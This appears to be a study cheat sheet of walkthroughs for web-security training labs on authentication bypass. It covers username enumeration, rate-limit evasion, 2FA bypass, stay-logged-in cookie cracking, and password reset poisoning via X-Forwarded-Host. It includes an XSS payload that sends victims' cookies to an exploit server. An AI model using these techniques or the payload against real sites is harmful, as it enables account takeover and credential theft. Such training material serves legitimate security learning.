# Authentication bypass

## Summary
* [Exploiting password-based login](#exploiting-password-based-login)
	* [Username enumeration via different responses](#username-enumeration-via-different-responses)
	* [Username enumeration via subtly different responses](#username-enumeration-via-subtly-different-responses)
	* [Username enumeration via response timing](#username-enumeration-via-response-timing)
	* [Username enumeration via account lock](#username-enumeration-via-account-lock)
	* [Broken brute-force protection with IP block](#broken-brute-force-protection-with-ip-block)
	* [Broken brute-force protection with multiple credentials per request](#broken-brute-force-protection-with-multiple-credentials-per-request)
* [Exploiting multi-factor authentications](#exploiting-multi-factor-authentications)
	* [2FA simple bypass](#2fa-simple-bypass)
	* [2FA broken login](#2fa-broken-logic)
* [Exploiting other authentications mechanisms](#exploiting-other-authentications-mechanisms)
	* [Brute-forcing a stay-logged-in cookie](#brute-forcing-a-stay-logged-in-cookie)
	* [Stealing stay-logged-in cookie with XSS](#stealing-stay-logged-in-cookie-with-xss)
	* [Password reset exploitation due to weak implementation](#password-reset-exploitation-due-to-weak-implementation)
	* [Password reset poisoning via middleware](#password-reset-poisoning-via-middleware)
	* [Password brute-forced via change password functionality](#password-brute-forced-via-change-password-functionality)

## Exploiting password-based login
### Username enumeration via different responses
```
> login into the application with arbitrary credentials and send the request to intruder
> clear the payload position and add a new position surrounding the arbitrary username to brute-force the username
> using the wordlists provided, paste it into the payload list options then start the attack
> different responses indicate that username is correct, take note of the username
> go back to the payload position and clear them, replace the arbitrary username with the correct username then add a new position surrounding the password to brute-force the passwords
> using the wordlists provided, paste it into the payload list options then start the attack
> different responses indicate that the password is correct
> using the brute-forced credentials, log in into the application
```
### Username enumeration via subtly different responses
```
> login into the application with arbitrary credentials and send the request to intruder
> clear the payload position and add a new position surrounding the arbitrary username to brute-force the usernames
> using the wordlists provided, paste it into the payload list options then start the attack
> observe that all the responses has different responses making it difficult to identify the correct username
> on the options tab, scroll down to "Grep-Extract" and click "add"
> click on "fetch response" and highlight the error that is omitted by the application when the login fails
    # "Invalid username or password."
> start the attack again and observe there is an additional column containing the error massage you extracted
> sort the results and notice one of them is subtly different than the others, take note of the username
> go back to the payload position and clear them, replace the arbitrary username with the correct username then add a new position surrounding the password to brute-force the password
> using the wordlists provided, paste it into the payload list options then start the attack
> sort the results and notice one of them is subtly different than the others, take note of the password
> using the brute-forced credentials, log in into the application
```
### Username enumeration via response timing
```
> login into the application with arbitrary credentials and send the request to repeater
> send the request for few times and observe that your ip has been blocked because of too many authentication trials
> send the request to intruder to brute-force the credentials
> select the attack type to Pitchfork for multiple payloads
> add an additional header 'X-Forwarded-For: 1' to spoof your ip address for each authentication trial
> set the password to a very long string to significantly increase the response time
> clear the payload position and add a new position surrounding the 'X-Forwarded-For' value and another one surrounding the arbitrary username
> on the payloads tab, select payload set 1, select the Numbers payload type and enter the range 1-100 with the step set on 1, then set the max fraction digits to 0
> select payload set 2, using the wordlists provided, paste it into the payload list options then start the attack
> when the attack finish, on the Collumn tab, select Response received and Response completed options
> notice that one of the response times was significantly longer than others, take note of the username
> clear the arbitrary username payload position and replace with the correct username
> add a new payload position surrounding the arbitrary password
> select payload set 2, using the wordlists provided, paste it into the payload list options then start the attack
> observe the response status, different status responses indicate that the password might be correct
> using the brute-force credentials, log in into the application
```
### Username enumeration via account lock
```
> investigate the login page and observe that your account is temporarily blocked if you submit 5 incorrect logins in a row
> login into the application with arbitrary credentials and send the request to intruder
> select the attack type to Cluster bomb
> clear the payload position and add a new positions surrounding the arbitrary username and add a blank payload position to the end of the request line
    # username=§invalid-username§&password=example§§
> select payload set 1, paste the wordlists provided
> select payload set 2, select Null payloads type and choose the option to generate 5 payloads
    # this will cause each username to be repeated 5 times
> start the attack and look for different length responses and study the response more closely and notice that it contains a different error message
    # "You have made too many incorrect login attempts"
    # this indicates that the username is valid
> clear the payload position, replace the arbitrary username with the correct username and add a new payload position surrounding the arbitrary password
> change the attack type back to Sniper attack
> paste the wordlists provided to the payload set then start the attack
> look for different lenth responses, this indicates the password is valid
> using the brute-forced credentials, log in into the application
```
### Broken brute-force protection with IP block
```
> investigate the login page and observe that your IP is temporarily blocked if you submit 3 incorrect logins in a row
> however, notice that you can reset the counter by loggin in to your own account before the limit is reached
> login into the application with arbitrary credentials and send the request to intruder
> select the attack type to Pitchfork for multiple payloads
> clear the payload position and add a new positions in both the username and password parameters value
> on payload set 1, use a wordlist that alternates between your username and the victim's username
    # wiener
    # carlos
    # wiener
    # carlos
> on payload set 2, use a wordlist that alternates between your password and the password candidates
    # peter
    # 12345
    # peter
    # passwd
> make sure your password is aligned with your username in the other list
> add the attack to a resource pool with maximum concurrent requests set to 1 in order to send one request at a time then start the attack
> filter the results to hide responses with a 200 status code and sort the remaining results by username
> using the brute-forced credentials, log in into the application
```
### Broken brute-force protection with multiple credentials per request
```
> login into the application with arbitrary value and send the request to repeater
> notice that the POST /login request submits the login credentials in JSON format
    #  {
	"username":"carlos",
	"password":"test",
	"":""
}
> replace the password string with an array of the password candidates
    #	{
	"username":"carlos",
	"password":["test1","test2","test3",...]
	"":""
}
> send the request and observe a 302 response is returned
> right click on the request and select show response in browser
> the page loads and you are logged in as carlos
```

## Exploiting multi-factor authentications
### 2FA simple bypass
```
> assume a website login page implements 2FA but the application does not check wether the 2FA has been completed by the user
> login into your own account and use the 2FA code sent to your email
> take note of the redirected page /my-account
> logout from your account and enter the victim's credentials
> refresh the 2FA page and send the request to burp proxy
> change the path to /my-account then forward the request
> back to the website, observe that you have bypassed the 2FA authentication and successfully login to the victim's account
```
### 2FA broken logic
```
> assume a website login page implements 2FA but the website does not properly verify that the same user is completing the second step
> login into your own account then send the GET request for the 2FA page to burp proxy
> notice in the request, the verify parameter is used to determine which user's account is being accessed
> change the verify parameter value to the victim's username to ensure that a temporary 2FA code is generated for that user
> back to the website, submit an arbitrary 2FA code and send the POST request to burp intruder
> in intruder, change the verify parameter value to victim's username
> clear the payload position and add a new one surrounding the arbitrary 2FA code
> in the payloads tab, select the payload type as brute forcer
> change the payload options to necessary needs then run the attack
> wait until the attack is finish, submit the brute-forced 2FA code in the website with the verify parameter value set to victim's username
```

## Exploiting other authentications mechanisms
### Brute-forcing a stay-logged-in cookie
```
> assume a website has a stay logged in feature
> login into your own account with the stay logged in option checked then send the redirected page request to repeater which is the /my-account page
> in repeater, highlight the stay-logged-in cookie and study it with the Inspector panel
> the cookie is constructed as follows
    # base64(username+'md5HashOfPassword')
> to brute-force the md5 password hash, send the request to intruder
> in intruder, clear the payload position and add a new one surrounding the stay-logged-in cookie value
> in payload tab, add the password wordlists then under the payload processing, add the following rules in order
    # hash: MD5
    # add prefix: carlos:
    # encode: base64-encode
> what the payload processing does is it first generate a MD5 hash out of the wordlists provided, then add the MD5 hash after the prefix, and finally encoding them into base64 so the websites can run its validation properly
> in the options tab, under the Grep - Match, add a new expressions related to the /my-account page to differ wether the brute-forced is successful
> log out of your account before starting the attack and look for different status among the results
> take note of the response and use it to login to victim's account
```

### Stealing stay-logged-in cookie with XSS
```
> assume a website has a stay logged in feature and there is also a XSS vulnerability in the post commenting feature
> login into your own account and navigate to the post commenting feature
> submit a comment with XSS payload
    # <script>document.location='//exploit-server/'+document.cookie</script>
    # document.location forces every user to visit the given url
    # document.cookie will omit every user's cookies that visit the url
> on the exploit server, open the access log and observe there is a GET request from other users containing their stay-logged-in cookie
> copy the cookie and base64-decode it,then copy the MD5 hash to decrypt
> use the decrypted hash to login into victim's account
```
### Password reset exploitation due to weak implementation
```
> assume a website has a password reset functionality
> in the /login page, click on forgot password and enter your own username
> you should get an email for the password reset url
> navigate to the password reset page and submit a new password
> send the POST request to burp proxy and observe there is a username parameter that determines which use is resetting the password
> change the username to victim's username and forward the request
> go back to the application and login with the victim's username and the new password created by you
```
### Password reset poisoning via middleware
```
> go to any login page and request for password reset for your own account
> observe what happens and most "password reset" link will contain a temperory token
> now request for password reset for any known email address and replace the "Host" header with attacker domain server name
> notice that the website or the server does not recognized the domain server and as result, no temporary token were generated
> request for password reset again but this time, leave the "Host" header as usual but then add another header "X-Forwarded-Host: attacker.domain.server.name"
> send the request and notice that the password reset request is successful
> navigate to access log on attacker domain server and notice there is a GET request with temporary token in the url that should belong to the victim account
> copy the previous password reset url for your own account and replace the token with the victim token
> go to the url and change the password
```
### Password brute-forced via change password functionality
```
> assume a  website has a password reset functionality
> login with your own account credentials and navigate to /my-account page
> observe that there is a change password functionality
> study how the process works and notice that if you entered the correct current password but two different new password, an error will get omitted saying "New passwords do not match"
> also notice that if you entered a wrong current password and two different new passwords, an error will get omitted saying "current password is incorrect"
> we could use this error messages to brute-force the victim's password
> submit the change password form with arbitrary current password and two different new password, then send the POST request to burp intruder
> in intruder, clear the payload position and add a new one surrounding the arbitrary current password
> use the wordlists provided for this brute-force attack
> in the options tab, under the Grep - Match, add a new expressions "New passwords do not match" then start the attack
> look for different responses in the result and take note of the password
```
